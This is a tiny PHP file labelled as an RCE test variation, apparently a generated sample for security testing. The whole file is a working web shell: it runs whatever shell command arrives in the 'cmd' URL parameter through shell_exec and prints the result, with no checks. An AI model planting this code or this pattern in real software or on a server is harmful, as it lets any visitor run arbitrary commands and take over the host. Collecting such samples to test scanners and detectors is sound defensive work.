<?php
// RCE test variation #916
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>